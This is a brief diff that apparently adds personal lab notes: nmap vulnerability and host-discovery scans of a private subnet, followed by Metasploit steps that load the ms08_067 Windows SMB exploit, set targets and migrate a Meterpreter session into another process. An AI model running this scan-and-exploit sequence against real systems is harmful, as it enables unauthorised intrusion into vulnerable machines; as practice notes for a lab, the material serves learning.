@@ -1,0 +1,7 @@
+sudo nmap -O -sV --script vuln 10.0.2.4/24 ---->Ver CVE
+nmap -sP 10.0.2.4/24
+search ms08_067
+options
+show options
+set rhosts ip
+run migrate -p 1512
